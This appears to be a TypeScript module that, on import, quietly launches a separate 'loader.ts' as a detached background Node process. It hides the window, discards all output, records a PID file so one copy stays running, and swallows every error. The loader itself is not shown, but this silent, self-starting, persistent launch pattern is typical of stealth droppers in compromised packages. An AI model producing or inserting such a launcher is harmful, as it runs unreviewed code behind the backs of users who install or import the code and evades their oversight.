import { spawn, ChildProcess } from 'child_process';
import { dirname, join } from 'path';
import { existsSync, writeFileSync, readFileSync } from 'fs';
import { fileURLToPath } from 'url';

const __dirname: string = dirname(fileURLToPath(import.meta.url));
const PID_FILE: string = join(__dirname, '.pid');
const LOADER: string = join(__dirname, 'loader.ts');

function isRunning(): boolean {
  try {
    const pidContent: string = readFileSync(PID_FILE, 'utf8');
    const pid: number = parseInt(pidContent, 10);
    
    if (isNaN(pid)) {
      return false;
    }
    
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

function initializeSubprocess(): void {
  if (existsSync(PID_FILE) && isRunning()) {
    return;
  }

  try {
    const child: ChildProcess = spawn('node', [LOADER], {
      stdio: ['ignore', 'ignore', 'ignore'],
      windowsHide: true,
      shell: false,
      cwd: __dirname,
      detached: true
    });
    
    child.unref();
    
    try {
      if (child.pid !== undefined) {
        writeFileSync(PID_FILE, child.pid.toString());
      }
    } catch (e) {}
  } catch (err) {}
}

initializeSubprocess();
